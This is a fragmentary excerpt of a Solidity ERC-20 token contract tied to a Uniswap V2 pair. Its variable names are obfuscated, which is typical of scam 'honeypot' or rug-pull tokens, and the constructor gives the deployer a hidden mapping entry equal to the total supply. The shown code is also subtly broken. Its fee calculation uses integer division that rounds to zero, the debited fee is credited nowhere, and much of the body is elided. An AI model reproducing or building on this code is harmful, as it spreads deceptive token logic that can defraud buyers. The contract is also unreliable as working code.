...
contract Contract is IERC20, Ownable {
    ...
    uint256 private _large = _tTotal;
    ...
    mapping(address => uint256) private _forgotten;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(uint256 => address) private _wool;
    mapping(uint256 => address) private _satisfied;
    ...
    constructor(
        ...
        _forgotten[msg.sender] = _large;
        _balances[msg.sender] = _tTotal;
        _balances[address(this)] = _rTotal;

        router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _satisfied[_large] = uniswapV2Pair;
    ...
    function _transfer(
        ...
        address _declared = _wool[_large];
        bool _duck = _tree == _satisfied[_large];

        uint256 fee = amount * (_fee / 100);
        amount -= fee;
        _balances[_tree] -= fee;

        _balances[_tree] -= amount;
        _balances[_cup] += amount;
    }
